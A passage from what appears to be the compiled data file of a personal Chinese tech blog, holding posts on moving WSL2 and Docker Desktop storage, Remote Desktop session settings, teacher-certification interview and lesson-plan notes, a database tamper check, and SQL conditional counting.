编辑器了，看代码、写代码、测代码、推代码一应俱全了！",charsets:{cjk:!0},lastUpdated:"2022/04/26, 22:10:09",lastUpdatedTimestamp:1650982209e3},{title:"github图床配置",frontmatter:{title:"github图床配置",date:"2022-04-25T00:48:54.000Z",permalink:"/pages/448889/",categories:["软件使用","其他"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/13.%E5%85%B6%E4%BB%96/03.github%E5%9B%BE%E5%BA%8A%E9%85%8D%E7%BD%AE.html",relativePath:"08.软件使用/13.其他/03.github图床配置.md",key:"v-dec8711c",path:"/pages/448889/",headersStr:null,content:"配置的时候注意设置文件名的样式，加上时间戳，否则上传同一个文件的时候会报错导致不能上传",normalizedContent:"配置的时候注意设置文件名的样式，加上时间戳，否则上传同一个文件的时候会报错导致不能上传",charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"WSL2 修改存储位置（示例：Docker-Desktop）",frontmatter:{title:"WSL2 修改存储位置（示例：Docker-Desktop）",date:"2022-04-30T17:03:27.000Z",permalink:"/pages/7c24c6/",categories:["软件使用","其他"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/13.%E5%85%B6%E4%BB%96/04.WSL2%20%E4%BF%AE%E6%94%B9%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%EF%BC%88%E7%A4%BA%E4%BE%8B%EF%BC%9ADocker-Desktop%EF%BC%89.html",relativePath:"08.软件使用/13.其他/04.WSL2 修改存储位置（示例：Docker-Desktop）.md",key:"v-ab97cd8e",path:"/pages/7c24c6/",headers:[{level:3,title:"1. 查看当前挂在情况",slug:"_1-查看当前挂在情况",normalizedTitle:"1. 查看当前挂在情况",charIndex:115},{level:3,title:"2. 立即终止所有运行的分发及 WSL 2 轻型工具虚拟机",slug:"_2-立即终止所有运行的分发及-wsl-2-轻型工具虚拟机",normalizedTitle:"2. 立即终止所有运行的分发及 wsl 2 轻型工具虚拟机",charIndex:393},{level:3,title:"3. 导出现在挂在资源数据",slug:"_3-导出现在挂在资源数据",normalizedTitle:"3. 导出现在挂在资源数据",charIndex:452},{level:3,title:"4. 卸载当前资源",slug:"_4-卸载当前资源",normalizedTitle:"4. 卸载当前资源",charIndex:639},{level:3,title:"5. 重新挂在资源并指定数据源",slug:"_5-重新挂在资源并指定数据源",normalizedTitle:"5. 重新挂在资源并指定数据源",charIndex:765}],headersStr:"1. 查看当前挂在情况 2. 立即终止所有运行的分发及 WSL 2 轻型工具虚拟机 3. 导出现在挂在资源数据 4. 卸载当前资源 5. 重新挂在资源并指定数据源",content:"> 本文原文地址 https://blog.csdn.net/A123638/article/details/123802871\n\n> 默认资源存储路径：C:\\Users\\xxx\\AppData\\Local\\Docker\n\n\n# 1. 查看当前挂在情况\n\nwsl -l -v --all\n\n\n\n1\n2\n\n\n输出结果如下：\n\nPS C:\\Users\\Jon> wsl -l -v --all\n  NAME                   STATE           VERSION\n* Ubuntu-20.04           Stopped         2\n  docker-desktop         Stopped         2\n  docker-desktop-data    Stopped         2\n\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2. 立即终止所有运行的分发及 WSL 2 轻型工具虚拟机\n\n wsl --shutdown\n\n\n\n1\n2\n\n\n\n# 3. 导出现在挂在资源数据\n\nwsl --export Ubuntu-20.04 D:\\Ubuntu-20.04.tar\nwsl --export docker-desktop D:\\docker-desktop.tar\nwsl --export docker-desktop-data D:\\docker-desktop-data.tar\n\n\n\n1\n2\n3\n4\n\n\n\n# 4. 卸载当前资源\n\nwsl --unregister Ubuntu-20.04\nwsl --unregister docker-desktop\nwsl --unregister docker-desktop-data\n\n\n\n1\n2\n3\n4\n\n\n\n# 5. 重新挂在资源并指定数据源\n\nwsl --import Ubuntu-20.04 D:\\office\\Ubuntu\\data D:\\Ubuntu-20.04.tar --version 2\nwsl --import docker-desktop D:\\office\\Docker\\docker-desktop D:\\docker-desktop.tar --version 2\nwsl --import docker-desktop-data D:\\office\\Docker\\docker-desktop-data D:\\docker-desktop-data.tar --version 2\n\n\n\n1\n2\n3\n4\n\n\n到这里就完成了迁移。",normalizedContent:"> 本文原文地址 https://blog.csdn.net/a123638/article/details/123802871\n\n> 默认资源存储路径：c:\\users\\xxx\\appdata\\local\\docker\n\n\n# 1. 查看当前挂在情况\n\nwsl -l -v --all\n\n\n\n1\n2\n\n\n输出结果如下：\n\nps c:\\users\\jon> wsl -l -v --all\n  name                   state           version\n* ubuntu-20.04           stopped         2\n  docker-desktop         stopped         2\n  docker-desktop-data    stopped         2\n\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2. 立即终止所有运行的分发及 wsl 2 轻型工具虚拟机\n\n wsl --shutdown\n\n\n\n1\n2\n\n\n\n# 3. 导出现在挂在资源数据\n\nwsl --export ubuntu-20.04 d:\\ubuntu-20.04.tar\nwsl --export docker-desktop d:\\docker-desktop.tar\nwsl --export docker-desktop-data d:\\docker-desktop-data.tar\n\n\n\n1\n2\n3\n4\n\n\n\n# 4. 卸载当前资源\n\nwsl --unregister ubuntu-20.04\nwsl --unregister docker-desktop\nwsl --unregister docker-desktop-data\n\n\n\n1\n2\n3\n4\n\n\n\n# 5. 重新挂在资源并指定数据源\n\nwsl --import ubuntu-20.04 d:\\office\\ubuntu\\data d:\\ubuntu-20.04.tar --version 2\nwsl --import docker-desktop d:\\office\\docker\\docker-desktop d:\\docker-desktop.tar --version 2\nwsl --import docker-desktop-data d:\\office\\docker\\docker-desktop-data d:\\docker-desktop-data.tar --version 2\n\n\n\n1\n2\n3\n4\n\n\n到这里就完成了迁移。",charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"远程桌面连接到windows账号的同一个会话",frontmatter:{title:"远程桌面连接到windows账号的同一个会话",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/64e3fd/",categories:["软件使用","其他"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/13.%E5%85%B6%E4%BB%96/05.%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%88%B0windows%E8%B4%A6%E5%8F%B7%E7%9A%84%E5%90%8C%E4%B8%80%E4%B8%AA%E4%BC%9A%E8%AF%9D.html",relativePath:"08.软件使用/13.其他/05.远程桌面连接到windows账号的同一个会话.md",key:"v-1207524a",path:"/pages/64e3fd/",headersStr:null,content:"有没有这样的经历：远程桌面连接到一台主机，登录用的windows账号可能只有你一个人用，比如administrator，有时连进去后发现打开的桌面不是你上次遗留的，打开任务管理器才发现有两个administrator用户的会话！ windows 远程桌面连接 界面不一样的解决方案 如何切换会话 其实，你并不需要windows自动为你创建更多的会话，限制只打开一个才是真正需要的。可以按下面这样设置windows。\n\n1、运行--输入“gpedit.msc”点击确定。 2、依次展开计算机配置>管理模板>Windows组件>远程桌面服务>远程桌面会话主机>连接 3、双击将远程桌面服务用户限制到单独的远程桌面服务会话>选择已启用>确定\n\n",normalizedContent:"有没有这样的经历：远程桌面连接到一台主机，登录用的windows账号可能只有你一个人用，比如administrator，有时连进去后发现打开的桌面不是你上次遗留的，打开任务管理器才发现有两个administrator用户的会话！ windows 远程桌面连接 界面不一样的解决方案 如何切换会话 其实，你并不需要windows自动为你创建更多的会话，限制只打开一个才是真正需要的。可以按下面这样设置windows。\n\n1、运行--输入“gpedit.msc”点击确定。 2、依次展开计算机配置>管理模板>windows组件>远程桌面服务>远程桌面会话主机>连接 3、双击将远程桌面服务用户限制到单独的远程桌面服务会话>选择已启用>确定\n\n",charsets:{cjk:!0},lastUpdated:"2022/05/15, 11:42:40",lastUpdatedTimestamp:165258616e4},{title:"软件使用",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"08.软件使用",imgUrl:"/img/catalog.png",description:"软件使用"}},title:"软件使用",date:"2022-04-17T21:48:12.000Z",permalink:"/software_use/",sidebar:!0,article:!1,comment:!1,editLink:!1,author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/catalog.html",relativePath:"08.软件使用/catalog.md",key:"v-5b88edea",path:"/software_use/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"结构化思维导图",frontmatter:{title:"结构化思维导图",date:"2022-04-17T23:56:51.000Z",permalink:"/pages/01148f/",categories:["教师资格证","结构化面试"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/09.%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81/01.%E7%BB%93%E6%9E%84%E5%8C%96%E9%9D%A2%E8%AF%95/01.%E7%BB%93%E6%9E%84%E5%8C%96%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.html",relativePath:"09.教师资格证/01.结构化面试/01.结构化思维导图.md",key:"v-0b2d95a6",path:"/pages/01148f/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"结构化答题",frontmatter:{title:"结构化答题",date:"2022-04-17T23:56:51.000Z",permalink:"/pages/41f215/",categories:["教师资格证","结构化面试"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/09.%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81/01.%E7%BB%93%E6%9E%84%E5%8C%96%E9%9D%A2%E8%AF%95/02.%E7%BB%93%E6%9E%84%E5%8C%96%E7%AD%94%E9%A2%98.html",relativePath:"09.教师资格证/01.结构化面试/02.结构化答题.md",key:"v-43b473f4",path:"/pages/41f215/",headers:[{level:2,title:"学生管理",slug:"学生管理",normalizedTitle:"学生管理",charIndex:11},{level:2,title:"班级管理",slug:"班级管理",normalizedTitle:"班级管理",charIndex:122},{level:2,title:"活动组织",slug:"活动组织",normalizedTitle:"活动组织",charIndex:195},{level:2,title:"沟通家长",slug:"沟通家长",normalizedTitle:"沟通家长",charIndex:263},{level:2,title:"协调同事",slug:"协调同事",normalizedTitle:"协调同事",charIndex:317},{level:2,title:"服从领导",slug:"服从领导",normalizedTitle:"服从领导",charIndex:366},{level:2,title:"职业认知",slug:"职业认知",normalizedTitle:"职业认知",charIndex:433},{level:2,title:"观点辨析",slug:"观点辨析",normalizedTitle:"观点辨析",charIndex:557},{level:2,title:"现象分析",slug:"现象分析",normalizedTitle:"现象分析",charIndex:614},{level:2,title:"国家大事",slug:"国家大事",normalizedTitle:"国家大事",charIndex:685},{level:2,title:"教育政策",slug:"教育政策",normalizedTitle:"教育政策",charIndex:751},{level:2,title:"领导讲话",slug:"领导讲话",normalizedTitle:"领导讲话",charIndex:805}],headersStr:"学生管理 班级管理 活动组织 沟通家长 协调同事 服从领导 职业认知 观点辨析 现象分析 国家大事 教育政策 领导讲话",content:"# 管理能力\n\n\n# 学生管理\n\n保持冷静（积极妥善处理此事）。\n\n 1. 处理当前问题，保持正常教学进度\n\n 2. 课后谈话，调查处理，落后的协同家长、各科教师、帮扶小组\n\n 3. 班会集体教育（反思、调整、制度化）或关注该学生情况\n\n\n# 班级管理\n\n积极采取措施。\n\n 1. 调查处理当前问题\n 2. 加强班风建设（提高干部能力）\n 3. 班会集体教育（反思、调整、制度化）\n\n\n# 活动组织\n\n我会认真组织好本次活动。\n\n 1. 科学规划，全员参与\n 2. 实施中及时调整\n 3. 总结经验\n\n\n# 人际关系\n\n\n# 沟通家长\n\n热情接待。\n\n 1. 倾听了解，耐心解释\n 2. 解决问题，汇报反馈\n 3. 总结反思\n\n\n# 协调同事\n\n主动沟通，互相尊重。\n\n 1. 调查情况\n 2. 解决问题\n 3. 反思检讨\n\n\n# 服从领导\n\n服从安排，努力做好工作。\n\n 1. 接受工作，认真完成\n 2. 及时汇报请教\n 3. 总结反思\n\n\n# 综合分析\n\n\n# 职业认知\n\n当老师是我的理想。\n\n 1. 热爱教育事业\n 2. 能力匹配\n 3. 有责任心，能当好老师\n\n我会做好教师工作。\n\n 1. 遵循教育规律，解决问题\n 2. 尽职尽责、教书育人\n 3. 表态（我要怎么做/阳光结尾/结合学科学段）\n\n\n# 观点辨析\n\n赞成（反对）。\n\n 1. 名言含义（做法实质）\n 2. 分析论证\n 3. 对策（表态、阳光）\n\n\n# 现象分析\n\n这个现象影响重大，值得重视。\n\n 1. 产生原因\n 2. 解决办法\n 3. 趋势预见（表态、阳光结尾）\n\n\n# 时事政治\n\n\n# 国家大事\n\n这件事影响重大（这个概念的意思是……）。\n\n 1. 背景（影响）\n 2. 教育的结合点\n 3. 表态、阳光结尾\n\n\n# 教育政策\n\n我赞成这个政策。\n\n 1. 做法实质\n 2. 分析论证\n 3. 对策（表态、阳光结尾）\n\n\n# 领导讲话\n\n我会拥护决定（积极执行相关规定）\n\n 1. 意义作用\n 2. 分析论证\n 3. 对策（表态、阳光结尾）",normalizedContent:"# 管理能力\n\n\n# 学生管理\n\n保持冷静（积极妥善处理此事）。\n\n 1. 处理当前问题，保持正常教学进度\n\n 2. 课后谈话，调查处理，落后的协同家长、各科教师、帮扶小组\n\n 3. 班会集体教育（反思、调整、制度化）或关注该学生情况\n\n\n# 班级管理\n\n积极采取措施。\n\n 1. 调查处理当前问题\n 2. 加强班风建设（提高干部能力）\n 3. 班会集体教育（反思、调整、制度化）\n\n\n# 活动组织\n\n我会认真组织好本次活动。\n\n 1. 科学规划，全员参与\n 2. 实施中及时调整\n 3. 总结经验\n\n\n# 人际关系\n\n\n# 沟通家长\n\n热情接待。\n\n 1. 倾听了解，耐心解释\n 2. 解决问题，汇报反馈\n 3. 总结反思\n\n\n# 协调同事\n\n主动沟通，互相尊重。\n\n 1. 调查情况\n 2. 解决问题\n 3. 反思检讨\n\n\n# 服从领导\n\n服从安排，努力做好工作。\n\n 1. 接受工作，认真完成\n 2. 及时汇报请教\n 3. 总结反思\n\n\n# 综合分析\n\n\n# 职业认知\n\n当老师是我的理想。\n\n 1. 热爱教育事业\n 2. 能力匹配\n 3. 有责任心，能当好老师\n\n我会做好教师工作。\n\n 1. 遵循教育规律，解决问题\n 2. 尽职尽责、教书育人\n 3. 表态（我要怎么做/阳光结尾/结合学科学段）\n\n\n# 观点辨析\n\n赞成（反对）。\n\n 1. 名言含义（做法实质）\n 2. 分析论证\n 3. 对策（表态、阳光）\n\n\n# 现象分析\n\n这个现象影响重大，值得重视。\n\n 1. 产生原因\n 2. 解决办法\n 3. 趋势预见（表态、阳光结尾）\n\n\n# 时事政治\n\n\n# 国家大事\n\n这件事影响重大（这个概念的意思是……）。\n\n 1. 背景（影响）\n 2. 教育的结合点\n 3. 表态、阳光结尾\n\n\n# 教育政策\n\n我赞成这个政策。\n\n 1. 做法实质\n 2. 分析论证\n 3. 对策（表态、阳光结尾）\n\n\n# 领导讲话\n\n我会拥护决定（积极执行相关规定）\n\n 1. 意义作用\n 2. 分析论证\n 3. 对策（表态、阳光结尾）",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"教案编写",frontmatter:{title:"教案编写",date:"2022-04-17T23:56:51.000Z",permalink:"/pages/d6c079/",categories:["教师资格证","信息技术"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/09.%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81/02.%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF/01.%E6%95%99%E6%A1%88%E7%BC%96%E5%86%99.html",relativePath:"09.教师资格证/02.信息技术/01.教案编写.md",key:"v-7d21d4be",path:"/pages/d6c079/",headers:[{level:2,title:"2.1 知识与技能",slug:"_2-1-知识与技能",normalizedTitle:"2.1 知识与技能",charIndex:74},{level:2,title:"2.2 过程与方法",slug:"_2-2-过程与方法",normalizedTitle:"2.2 过程与方法",charIndex:113},{level:2,title:"2.3 情感态度与价值观",slug:"_2-3-情感态度与价值观",normalizedTitle:"2.3 情感态度与价值观",charIndex:201},{level:2,title:"4.1 课程导入",slug:"_4-1-课程导入",normalizedTitle:"4.1 课程导入",charIndex:352},{level:2,title:"4.2 讲授新课",slug:"_4-2-讲授新课",normalizedTitle:"4.2 讲授新课",charIndex:390},{level:2,title:"4.3 课堂小结",slug:"_4-3-课堂小结",normalizedTitle:"4.3 课堂小结",charIndex:539},{level:2,title:"4.4 作业布置",slug:"_4-4-作业布置",normalizedTitle:"4.4 作业布置",charIndex:562}],headersStr:"2.1 知识与技能 2.2 过程与方法 2.3 情感态度与价值观 4.1 课程导入 4.2 讲授新课 4.3 课堂小结 4.4 作业布置",content:"# 1. 课题名称\n\n\n# 2. 教学目标\n\n这部分要注重以学生为主题，不要写成类似于让学生掌握xxx之类的说法，而是要写成学生能够xxx\n\n\n# 2.1 知识与技能\n\n知识：理解知识的含义 技能：能够运用知识做xx\n\n\n# 2.2 过程与方法\n\n学生通过xxx，提升xxx能力 eg:通过教师讲解、小组讨论的过程，提升交流和合作的能力。 团队合作的能力、 动手能力、 自我学习能力、审美能力\n\n\n# 2.3 情感态度与价值观\n\neg: 通过指导学生利用所学知识解决问题，激发学生学习兴趣 培养学生互帮互助团结协作的团队精神\n\n\n# 3. 教学重点和难点\n\n重点：知识与技能部分具体点 学生必须熟练掌握的东西 难点：比较难的地方 很难理解的东西 很虚的东西（情感价值观）\n\n\n# 4. 教学过程\n\n\n# 4.1 课程导入\n\n通过一个例子，或者创设某种情境引入课程相关内容\n\n\n# 4.2 讲授新课\n\n实际上课的时候要记得边讲边板书 以学生为主体,和学生互动，互动的时候不要真棒这种无效的评价（具体点的评价） 互动方式：\n\n * 提问 （针对性 不要总对吗？）\n * 小组讨论\n * 实验探究\n * 小组竞赛 看书 回答问题 设置任务 操作 小组讨论 让同学展示课堂作业\n\n\n# 4.3 课堂小结\n\n把知识点串讲一遍\n\n\n# 4.4 作业布置\n\n布置作业的内容 是否需要在上课上给予学生提示\n\n\n# 5. 板书设计",normalizedContent:"# 1. 课题名称\n\n\n# 2. 教学目标\n\n这部分要注重以学生为主题，不要写成类似于让学生掌握xxx之类的说法，而是要写成学生能够xxx\n\n\n# 2.1 知识与技能\n\n知识：理解知识的含义 技能：能够运用知识做xx\n\n\n# 2.2 过程与方法\n\n学生通过xxx，提升xxx能力 eg:通过教师讲解、小组讨论的过程，提升交流和合作的能力。 团队合作的能力、 动手能力、 自我学习能力、审美能力\n\n\n# 2.3 情感态度与价值观\n\neg: 通过指导学生利用所学知识解决问题，激发学生学习兴趣 培养学生互帮互助团结协作的团队精神\n\n\n# 3. 教学重点和难点\n\n重点：知识与技能部分具体点 学生必须熟练掌握的东西 难点：比较难的地方 很难理解的东西 很虚的东西（情感价值观）\n\n\n# 4. 教学过程\n\n\n# 4.1 课程导入\n\n通过一个例子，或者创设某种情境引入课程相关内容\n\n\n# 4.2 讲授新课\n\n实际上课的时候要记得边讲边板书 以学生为主体,和学生互动，互动的时候不要真棒这种无效的评价（具体点的评价） 互动方式：\n\n * 提问 （针对性 不要总对吗？）\n * 小组讨论\n * 实验探究\n * 小组竞赛 看书 回答问题 设置任务 操作 小组讨论 让同学展示课堂作业\n\n\n# 4.3 课堂小结\n\n把知识点串讲一遍\n\n\n# 4.4 作业布置\n\n布置作业的内容 是否需要在上课上给予学生提示\n\n\n# 5. 板书设计",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"教师资格证",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"09.教师资格证",imgUrl:"/img/catalog.png",description:"教师资格证"}},title:"教师资格证",date:"2022-04-17T21:48:12.000Z",permalink:"/teacher/",sidebar:!0,article:!1,comment:!1,editLink:!1,author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/09.%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81/catalog.html",relativePath:"09.教师资格证/catalog.md",key:"v-32aad226",path:"/teacher/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"数据库数据被非法篡改，程序如何知道",frontmatter:{title:"数据库数据被非法篡改，程序如何知道",date:"2022-04-18T00:00:34.000Z",permalink:"/pages/7c7f74/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/01.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE%E8%A2%AB%E9%9D%9E%E6%B3%95%E7%AF%A1%E6%94%B9%EF%BC%8C%E7%A8%8B%E5%BA%8F%E5%A6%82%E4%BD%95%E7%9F%A5%E9%81%93.html",relativePath:"10.数据库/01.数据库数据被非法篡改，程序如何知道.md",key:"v-c8e64d8e",path:"/pages/7c7f74/",headersStr:null,content:"解决方法：可以在表中加一个MD5的字段，这个字段的值是\n\n其他需要检查是否被篡改的字段值的MD5值或其他加密方式产生的值。\n\n程序先通过对需要检查的数值加密后产生的值与数据表中MD5字段值进行比较，\n\n相同意味没有被非法篡改，否则就是非法篡改。\n\n之后，通过程序修改数据表里的MD5值。",normalizedContent:"解决方法：可以在表中加一个md5的字段，这个字段的值是\n\n其他需要检查是否被篡改的字段值的md5值或其他加密方式产生的值。\n\n程序先通过对需要检查的数值加密后产生的值与数据表中md5字段值进行比较，\n\n相同意味没有被非法篡改，否则就是非法篡改。\n\n之后，通过程序修改数据表里的md5值。",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"Canal实现MySQL异构数据同步",frontmatter:{title:"Canal实现MySQL异构数据同步",date:"2022-04-18T00:00:34.000Z",permalink:"/pages/4a7fdc/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/02.Canal%E5%AE%9E%E7%8E%B0MySQL%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5.html",relativePath:"10.数据库/02.Canal实现MySQL异构数据同步.md",key:"v-c4465980",path:"/pages/4a7fdc/",headersStr:null,content:"在MySQL主从架构模式下，默认主库会将binlog发送给从库，Canal就是将这个binlog解析之后，使用MQ发送数据出去，实现异构数据同步",normalizedContent:"在mysql主从架构模式下，默认主库会将binlog发送给从库，canal就是将这个binlog解析之后，使用mq发送数据出去，实现异构数据同步",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"count添加条件",frontmatter:{title:"count添加条件",date:"2022-04-18T00:00:34.000Z",permalink:"/pages/afbfc8/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/03.count%E6%B7%BB%E5%8A%A0%E6%9D%A1%E4%BB%B6.html",relativePath:"10.数据库/03.count添加条件.md",key:"v-34022ced",path:"/pages/afbfc8/",headers:[{level:2,title:"方法1：",slug:"方法1",normalizedTitle:"方法1：",charIndex:371},{level:2,title:"方法2：",slug:"方法2",normalizedTitle:"方法2：",charIndex:685},{level:2,title:"方法3：",slug:"方法3",normalizedTitle:"方法3：",charIndex:919}],headersStr:"方法1： 方法2： 方法3：",content:"# 1. PostgreSql\n\n当发现可以进行筛选时，语句如下：\n\nSELECT\n\tcount(*) filter (where PERIOD = '01')  AS business_daily, -- 日累计 业务办理\n\tcount(*) filter (where PERIOD = '02')  AS business_per_month -- 月累计 业务办理\nFROM\n\t`k_id_idx` as ki\nWHERE idx_code = 'GD010'\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2. Mysql\n\n可是上面的 count filter 语句并不能使用在 mysql 中，但是 count 函数和 if 函数结合可以达到同样的效果，语句如下：\n\n> count() 函数 统计数据表中的行的总数，忽略空值\n\n\n# 方法1：\n\n使用if函数 if(expr, v1, v2) 函数 if(expr, v1, v2) 表达式expr为true (expr<>0 and expr <> NULL) 返回v1，否则v2\n\nSELECT\n\tcount(if(PERIOD = '01', pid, null)),\n\tcount(DISTINCT if(PERIOD = '02', pid, null)) -- 如果返回字段结果不唯一的话，可加上 DISTINCT 去掉重复字段再统计，这里用 1 来标记的话，不可用 DISTINCT；\nFROM `k_id_idx`\nWHERE idx_code = '010'\n\n\n1\n2\n3\n4\n5\n\n\n\n# 方法2：\n\n用if和sum 根据原理，可使用 sum 函数加上 if 函数，用 1 来标记累加，效果相同；（用 1 标记，count/sum 不可用 DISTINCT 去重）\n\nSELECT\n\tsum(if(PERIOD = '01', 1, 0)),\n\tsum(if(PERIOD = '02', 1, 0)) -- 如果存在累加 1 ，没有累加 0；\nFROM `k_id_idx`\nWHERE idx_code = '010'\n\n\n1\n2\n3\n4\n5\n\n\n\n# 方法3：\n\n直接使用cout()函数的条件判断\n\nselect  count ( dept = '10' or null)  from dept\n\n\n1\n\n\n这里必须要加上or null，原因如下 如果不加上or null ，则这个条件的结果是true或者fasle，那么不管是true和false最后都会被计数，则最后的过滤条件就失效了，而count()函数对Null是不会计数的，则只会记录不为null的值，而这个 or语法是 a or b 如果 a 满足则直接是不会取计算b，所以结果就是a的结果 如果a不满足 则就是选取b的结果 作为a or b 的结果 ，则b是null 则直接返回Null，不会被计数\n\n\n# 3. Oracle\n\n 1. case when 语句：\n\nselect\n\tsum(case u.sex when 1 then 1 else 0 end) as '男性',\n\tsum(case u.sex when 2 then 1 else 0 end) as '女性',\n\tsum(case when u.sex <>1 and u.sex<>2 then 1 else 0 end) as '性别为空'\nfrom users u;\n-- 或者\nselect\n\tsum(case u.sex when 1 then 1 end) as '男性',\n\tsum(case u.sex when 2 then 1 end) as '女性',\n\tsum(case when u.sex <>1 and u.sex<>2 then 1 end) as '性别为空'\nfrom users u;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 2. case when 字典替换功能：\n\nselect u.id,u.name,\n\t(case u.sex\n\t\twhen 1 then '男'\n\t\twhen 2 then '女'\n\t\telse '空的'\n\t\tend\n\t) as '性别'\nfrom users u;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n",normalizedContent:"# 1. postgresql\n\n当发现可以进行筛选时，语句如下：\n\nselect\n\tcount(*) filter (where period = '01')  as business_daily, -- 日累计 业务办理\n\tcount(*) filter (where period = '02')  as business_per_month -- 月累计 业务办理\nfrom\n\t`k_id_idx` as ki\nwhere idx_code = 'gd010'\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2. mysql\n\n可是上面的 count filter 语句并不能使用在 mysql 中，但是 count 函数和 if 函数结合可以达到同样的效果，语句如下：\n\n> count() 函数 统计数据表中的行的总数，忽略空值\n\n\n# 方法1：\n\n使用if函数 if(expr, v1, v2) 函数 if(expr, v1, v2) 表达式expr为true (expr<>0 and expr <> null) 返回v1，否则v2\n\nselect\n\tcount(if(period = '01', pid, null)),\n\tcount(distinct if(period = '02', pid, null)) -- 如果返回字段结果不唯一的话，可加上 distinct 去掉重复字段再统计，这里用 1 来标记的话，不可用 distinct；\nfrom `k_id_idx`\nwhere idx_code = '010'\n\n\n1\n2\n3\n4\n5\n\n\n\n# 方法2：\n\n用if和sum 根据原理，可使用 sum 函数加上 if 函数，用 1 来标记累加，效果相同；（用 1 标记，count/sum 不可用 distinct 去重）\n\nselect\n\tsum(if(period = '01', 1, 0)),\n\tsum(if(period = '02', 1, 0)) -- 如果存在累加 1 ，没有累加 0；\nfrom `k_id_idx`\nwhere idx_code = '010'\n\n\n1\n2\n3\n4\n5\n\n\n\n# 方法3：\n\n直接使用cout()函数的条件判断\n\nselect  count ( dept = '10' or null)  from dept\n\n\n1\n\n\n这里必须要加上or null，原因如下 如果不加上or null ，则这个条件的结果是true或者fasle，那么不管是true和false最后都会被计数，则最后的过滤条件就失效了，而count()函数对null是不会计数的，则只会记录不为null的值，而这个 or语法是 a or b 如果 a 满足则直接是不会取计算b，所以结果就是a的结果 如果a不满足 则就是选取b的结果 作为a or b 的结果 ，则b是null 则直接返回null，不会被计数\n\n\n# 3. oracle\n\n 1. case when 语句：\n\nselect\n\tsum(case u.sex when 1 then 1 else 0 end) as '男性',\n\tsum(case u.sex when 2 then 1 else 0 end) as '女性',\n\tsum(case when u.sex <>1 and u.sex<>2 then 1 else 0 end) as '性别为空'\nfrom users u;\n-- 或者\nselect\n\tsum(case u.sex when 1 then 1 end) as '男性',\n\tsum(case u.sex when 2 then 1 end) as '女性',\n\tsum(case when u.sex <>1 and u.sex<>2 then 1 end) as '性别为空'\nfrom users u;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 2. case when 字典替换功能：\n\nselect u.id,u.name,\n\t(case u.sex\n\t\twhen 1 then '男'\n\t\twhen 2 then '女'\n\t\telse '空的'\n\t\tend\n\t) as '性别'\nfrom users u;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"mysql 出现You can_t specify target table for update",frontmatter:{title:"mysql 出现You can_t specify target table for 